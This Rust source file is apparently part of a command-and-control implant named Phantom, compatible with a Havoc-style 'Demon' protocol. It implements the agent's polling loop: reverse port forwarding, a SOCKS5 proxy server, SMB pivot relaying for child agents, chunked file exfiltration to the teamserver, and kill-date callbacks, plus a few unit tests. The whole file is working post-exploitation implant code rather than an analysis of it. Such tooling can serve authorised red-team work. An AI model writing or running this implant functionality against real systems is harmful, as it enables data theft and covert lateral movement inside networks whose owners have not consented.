//! Phantom state machine: polling, sockets, and [`PendingCallback`] payloads.

use std::io::{ErrorKind, Read};

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonPivotCommand, DemonSocketType,
};

use crate::error::PhantomError;

use super::encode::{
    encode_bool, encode_bytes, encode_bytes_result, encode_file_chunk, encode_file_close,
    encode_file_open, encode_rportfwd_remove, encode_socket_close, encode_socket_open,
    encode_socket_read_failure, encode_socket_read_success, encode_u32, encode_utf16,
};
use super::types::*;

use super::network::{
    connect_ipv4_target, connect_socks_target, pump_stream, raw_socket_error, read_available,
    send_socks_reply, try_parse_socks_greeting, try_parse_socks_request, write_all_nonblocking,
};
use super::pivot::pivot_read_frame;

impl PhantomState {
    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets().await?;
        self.poll_local_relays()?;
        self.poll_socks_clients().await?;
        self.push_download_chunks();
        self.poll_pivots();
        Ok(())
    }

    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
        std::mem::take(&mut self.pending_callbacks)
    }

    pub(crate) fn queue_callback(&mut self, callback: PendingCallback) {
        self.pending_callbacks.push(callback);
    }

    /// Prepend `front` in order before any existing pending callbacks.
    ///
    /// Used when a send fails after [`Self::drain_callbacks`] so drained work is not lost.
    pub(crate) fn requeue_callbacks_front(&mut self, front: Vec<PendingCallback>) {
        if front.is_empty() {
            return;
        }
        let rest = std::mem::take(&mut self.pending_callbacks);
        self.pending_callbacks = front;
        self.pending_callbacks.extend(rest);
    }

    /// Return the kill date set dynamically by the teamserver, if any.
    pub(crate) fn kill_date(&self) -> Option<i64> {
        self.kill_date
    }

    /// Return the working-hours bitmask set dynamically by the teamserver, if any.
    pub(crate) fn working_hours(&self) -> Option<i32> {
        self.working_hours
    }

    /// Set or clear the dynamic kill date (Unix timestamp in seconds).
    #[cfg(test)]
    pub(crate) fn set_kill_date(&mut self, kill_date: Option<i64>) {
        self.kill_date = kill_date;
    }

    /// Set or clear the dynamic working-hours bitmask.
    #[cfg(test)]
    pub(crate) fn set_working_hours(&mut self, working_hours: Option<i32>) {
        self.working_hours = working_hours;
    }

    /// Queue a `CommandKillDate` callback to notify the teamserver that
    /// the kill date has been reached.
    pub(crate) fn queue_kill_date_callback(&mut self) {
        self.queue_callback(PendingCallback::KillDate { request_id: 0 });
    }

    /// Read a chunk from each running download and queue file-write callbacks.
    ///
    /// Downloads that have been fully read or marked for removal are cleaned up
    /// with a file-close callback.
    pub(crate) fn push_download_chunks(&mut self) {
        let mut finished_indices = Vec::new();

        for (index, download) in self.downloads.iter_mut().enumerate() {
            if download.state == DownloadTransferState::Stopped {
                continue;
            }

            if download.state == DownloadTransferState::Remove {
                finished_indices.push(index);
                continue;
            }

            let mut buf = vec![0u8; DOWNLOAD_CHUNK_SIZE];
            let read = match Read::read(&mut download.file, &mut buf) {
                Ok(n) => n,
                Err(_) => {
                    finished_indices.push(index);
                    continue;
                }
            };

            if read > 0 {
                buf.truncate(read);
                download.read_size += read as u64;
                self.pending_callbacks.push(PendingCallback::FileChunk {
                    request_id: download.request_id,
                    file_id: download.file_id,
                    data: buf,
                });
            }

            if read == 0 || download.read_size >= download.total_size {
                finished_indices.push(index);
            }
        }

        // Process removals in reverse order to maintain index validity.
        for &index in finished_indices.iter().rev() {
            let download = self.downloads.remove(index);
            self.pending_callbacks.push(PendingCallback::FileClose {
                request_id: download.request_id,
                file_id: download.file_id,
            });
        }
    }

    /// Poll all active pivot connections for data from child agents.
    ///
    /// For each pivot, reads length-framed messages from the Unix socket
    /// (non-blocking) and wraps them in `DEMON_PIVOT_SMB_COMMAND` callbacks
    /// for relay to the teamserver. Broken connections are automatically
    /// removed and reported via `DEMON_PIVOT_SMB_DISCONNECT`.
    pub(crate) fn poll_pivots(&mut self) {
        let mut disconnected: Vec<u32> = Vec::new();

        for (&agent_id, pivot) in &mut self.smb_pivots {
            // Read up to MAX_PIVOT_READS_PER_POLL framed messages per pivot.
            for _ in 0..MAX_PIVOT_READS_PER_POLL {
                match pivot_read_frame(&pivot.stream) {
                    Ok(Some(frame)) => {
                        let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbCommand));
                        payload.extend_from_slice(&encode_bytes_result(&frame));
                        self.pending_callbacks.push(PendingCallback::Structured {
                            command_id: u32::from(DemonCommand::CommandPivot),
                            request_id: 0,
                            payload,
                        });
                    }
                    Ok(None) => break, // no more data available
                    Err(_) => {
                        disconnected.push(agent_id);
                        break;
                    }
                }
            }
        }

        for agent_id in disconnected {
            let removed = self.smb_pivots.remove(&agent_id).is_some();
            let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
            payload.extend_from_slice(&encode_bool(removed));
            payload.extend_from_slice(&encode_u32(agent_id));
            self.pending_callbacks.push(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id: 0,
                payload,
            });
        }
    }

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => {
                        return Err(PhantomError::Socket(error.to_string()));
                    }
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_callback(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), PhantomError> {
        let server_ids = self.socks_proxies.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => return Err(PhantomError::Socket(error.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                        Err(error) => {
                            read_failure = Some(PendingCallback::Socket {
                                request_id: 0,
                                payload: encode_socket_read_failure(
                                    socket_id,
                                    socket.socket_type,
                                    raw_socket_error(&error),
                                ),
                            });
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    read_success = Some(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
                    });
                }
            }

            if let Some(callback) = read_failure {
                self.queue_callback(callback);
            }
            if let Some(callback) = read_success {
                self.queue_callback(callback);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) -> Result<(), PhantomError> {
        let relay_ids = self.local_relays.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }

        Ok(())
    }

    async fn poll_socks_clients(&mut self) -> Result<(), PhantomError> {
        let client_ids = self.socks_clients.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    if !remainder.is_empty() {
                                        write_all_nonblocking(&mut target, &remainder).map_err(
                                            |error| PhantomError::Socket(error.to_string()),
                                        )?;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }

    pub(crate) fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    pub(crate) fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
    }

    pub(crate) fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        let client_ids = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect::<Vec<_>>();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        let relay_ids = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect::<Vec<_>>();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_callback(PendingCallback::Socket {
            request_id: 0,
            payload: encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        });
    }
}

impl MemFile {
    pub(crate) fn append(&mut self, data: &[u8]) {
        self.data.extend_from_slice(data);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    pub(crate) fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

impl PendingCallback {
    pub(crate) fn command_id(&self) -> u32 {
        match self {
            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
            Self::Error { .. } => u32::from(DemonCommand::CommandError),
            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
            Self::KillDate { .. } => u32::from(DemonCommand::CommandKillDate),
            Self::Structured { command_id, .. } => *command_id,
            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
            Self::FileOpen { .. } | Self::FileChunk { .. } | Self::FileClose { .. } => {
                u32::from(DemonCommand::BeaconOutput)
            }
        }
    }

    pub(crate) fn request_id(&self) -> u32 {
        match self {
            Self::Output { request_id, .. }
            | Self::Error { request_id, .. }
            | Self::Exit { request_id, .. }
            | Self::KillDate { request_id, .. }
            | Self::Structured { request_id, .. }
            | Self::MemFileAck { request_id, .. }
            | Self::FsUpload { request_id, .. }
            | Self::Socket { request_id, .. }
            | Self::FileOpen { request_id, .. }
            | Self::FileChunk { request_id, .. }
            | Self::FileClose { request_id, .. } => *request_id,
        }
    }

    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
        match self {
            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
            Self::Error { text, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(0x0d));
                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
                Ok(payload)
            }
            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
            Self::KillDate { .. } => Ok(Vec::new()),
            Self::Structured { payload, .. } => Ok(payload.clone()),
            Self::MemFileAck { mem_file_id, success, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(*mem_file_id));
                payload.extend_from_slice(&encode_bool(*success));
                Ok(payload)
            }
            Self::FsUpload { file_size, path, .. } => {
                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
                payload.extend_from_slice(&encode_u32(*file_size));
                payload.extend_from_slice(&encode_utf16(path)?);
                Ok(payload)
            }
            Self::Socket { payload, .. } => Ok(payload.clone()),
            Self::FileOpen { file_id, file_size, file_path, .. } => {
                encode_file_open(*file_id, *file_size, file_path)
            }
            Self::FileChunk { file_id, data, .. } => encode_file_chunk(*file_id, data),
            Self::FileClose { file_id, .. } => encode_file_close(*file_id),
        }
    }
}

#[cfg(test)]
mod requeue_callback_tests {
    use crate::command::types::{PendingCallback, PhantomState};

    #[test]
    fn requeue_callbacks_front_prepends_in_order() {
        let mut state = PhantomState::default();
        state.queue_callback(PendingCallback::Output { request_id: 2, text: "after".into() });
        state.requeue_callbacks_front(vec![
            PendingCallback::Output { request_id: 0, text: "first".into() },
            PendingCallback::Output { request_id: 1, text: "second".into() },
        ]);
        let drained = state.drain_callbacks();
        assert_eq!(drained.len(), 3);
        assert!(matches!(&drained[0], PendingCallback::Output { text, .. } if text == "first"));
        assert!(matches!(&drained[1], PendingCallback::Output { text, .. } if text == "second"));
        assert!(matches!(&drained[2], PendingCallback::Output { text, .. } if text == "after"));
    }

    #[test]
    fn requeue_callbacks_front_empty_is_noop() {
        let mut state = PhantomState::default();
        state.queue_callback(PendingCallback::KillDate { request_id: 0 });
        state.requeue_callbacks_front(vec![]);
        assert_eq!(state.drain_callbacks().len(), 1);
    }
}
